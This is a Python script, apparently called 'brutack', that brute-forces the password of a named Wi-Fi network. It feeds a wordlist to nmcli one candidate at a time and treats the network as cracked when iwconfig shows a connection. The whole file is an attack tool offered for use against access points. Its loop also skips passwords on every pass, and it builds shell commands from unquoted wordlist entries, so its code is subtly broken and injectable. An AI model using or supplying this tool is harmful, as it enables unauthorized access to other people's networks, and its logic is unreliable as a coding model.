"""
Note that sometimes brutack decides that he found out correct
password, but the truth that it isn't: the problem is that
CHECK_CONNECTION_PAUSE is too low. Just try to increase it.
(See also check_connection() docs).

P.S. You should know that it is definitely not the fastest way to brute force.
"""

import time
import os
import sys
import threading
from functools import reduce
from logger import logger

# Set up these global variables as you wish before using.
START_FROM: int = 1  # Number of string of your file to start with
WIFI_NAME = 'SOME_WIFI_NAME'  # Name of the Wi-Fi point to attack
CHECK_CONNECTION_PAUSE = 15  # Pause before connection check (in secs).
FILE_WITH_PASSWORDS = 'geo_passwords.txt'  # Passwords list.
# Each new password should be on a new line.
# Don't worry, `\n`'s will have been handled correctly.
MIN_PASS_LEN = 8  # All passwords shorter than that will be ignored.


ATTEMPT_NO = 0  # For logs and prints (It isn't necessary to do something with this one)


def check_connection() -> bool:
    """Checks if there is wi-fi connection or not.
    Returns True if it is, False - if it's not.

    You will get incorrect result of connection checking
    if CHECK_CONNECTION_PAUSE too low,
    because while connection is establishing it looks like
    THERE IS successful connection.
    """

    time.sleep(CHECK_CONNECTION_PAUSE)
    connection = os.popen('iwconfig', 'r')
    text = reduce((lambda x, y: str(x)+str(y)), connection.readlines())
    logger.debug(f'Connection text is:\n{text}')
    ESSID = text.find('ESSID:')
    connected = (text[ESSID+6:ESSID+9])
    logger.debug(f'Connected data:\n{connected}')
    connection.close()

    if str(connected) != 'off':
        return True
    if str(connected) == 'off':
        return False


def remove_connection():
    """Removes existing wi-fi connection.

    You should use it only in case when your OS each time tries to create
    NEW SEPARATE wi-fi connection profile in your wi-fi networks list.

    You shouldn't use it if:
        - you don't see any new "SOME_WIFI_NAME 1", "SOME_WIFI_NAME 2" (and so on)
        wi-fi networks in the wi-fi menu after usage of brutack
        - this script fails with errors like
        "can't delete wi-fi connection <SOME_WIFI_NAME 1>"
        while you use this function (I mean you had unsharped WARNING 12 (see bellow)).
    """
    try:
        command = f"nmcli connection delete '{WIFI_NAME} {ATTEMPT_NO}'"
        os.popen(command)
        logger.debug(f'Remove connection command is {command}')
    except Exception:
        pass


def password_generator(filename: str) -> str:
    """This function returns passwords from file, one by one."""
    file = open(filename, 'r')
    for line in file:
        if len(line.rstrip()) < MIN_PASS_LEN:
            continue
        yield line


def connect_to_wifi(wifiname: str, password: str, lock):
    """This function tries to connect to the designated wi-fi."""
    command = f'nmcli dev wifi connect {wifiname} password {password}'
    logger.debug('Command is:\n'+command)
    with lock:
        r = os.popen(command)
    logger.debug(f'Command result is:\n{r}')
    sys.exit()


def brute(wifiname: str, password_generator):

    done = False
    lock = threading.Lock()

    while not done:
        try:
            if START_FROM:
                [next(password_generator) for i in range(START_FROM)]
            if password := next(password_generator):
                t = threading.Thread(
                   target=connect_to_wifi,
                   args=(wifiname, password, lock,))
                t.start()
                t.join()

                global ATTEMPT_NO
                ATTEMPT_NO += 1

                done = check_connection()
                if not done:
                    print(f'Attempt no. {ATTEMPT_NO} with password {password}No result.')
                    logger.info(f'Attempt no. {ATTEMPT_NO} with password {password}No result.')
                    # WARNING 12: sometimes it is better to unsharp next string:
                    #  remove_connection()
                    #  check the docs of the remove_connection()
                    time.sleep(1)
                    continue
                else:
                    break

        except StopIteration:
            logger.info(f'Total attempts: {ATTEMPT_NO}.\n No success. Aborting process.')
            sys.exit()

    logger.info(f'Done! Attempt no.{ATTEMPT_NO}:\nThe password is {password}')


if __name__ == '__main__':
    pg = password_generator(FILE_WITH_PASSWORDS)
    brute(WIFI_NAME, pg)
